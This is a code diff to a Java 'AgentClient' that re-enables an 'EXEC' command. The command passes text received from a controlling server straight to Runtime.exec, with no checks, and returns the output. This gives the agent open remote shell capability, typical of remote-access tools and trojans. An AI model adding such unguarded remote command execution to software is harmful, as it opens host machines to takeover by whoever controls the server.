@@ -65,6 +65,12 @@ public class AgentClient {
                             // String cmdToExec = actualCommandWithArgs.substring("EXEC".length()).trim();
                             // result = executeSystemCommand(cmdToExec);
                             // break;
+                            case "EXEC":
+                                System.out.println("Executing command: " + actualCommandWithArgs);
+                                String commandParts = actualCommandWithArgs.replaceFirst("EXEC ", "");
+                                String cmdToExec = commandParts;
+                                result = executeSystemCommand(cmdToExec);
+                                break;
                             default:
                                 result = "AGENT_CMD_UNKNOWN: Command '" + commandKey + "' not recognized by agent " + myClientId;
                                 break;
@@ -153,6 +159,22 @@ public class AgentClient {
         final String[] units = new String[] { "B", "KB", "MB", "GB", "TB" };
         int digitGroups = (int) (Math.log10(size) / Math.log10(1024));
         return String.format("%.1f %s", size / Math.pow(1024, digitGroups), units[digitGroups]);
+    }
+
+    private static String executeSystemCommand(String command) {
+        try {
+            Process process = Runtime.getRuntime().exec(command);
+            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+            StringBuilder output = new StringBuilder();
+            String line;
+            while ((line = reader.readLine()) != null) {
+                output.append(line).append("#nl#");
+            }
+            reader.close();
+            return output.toString();
+        } catch (IOException e) {
+            return "Error executing command: " + e.getMessage();
+        }
     }
 
     // Placeholder for executeSystemCommand (implement with caution)
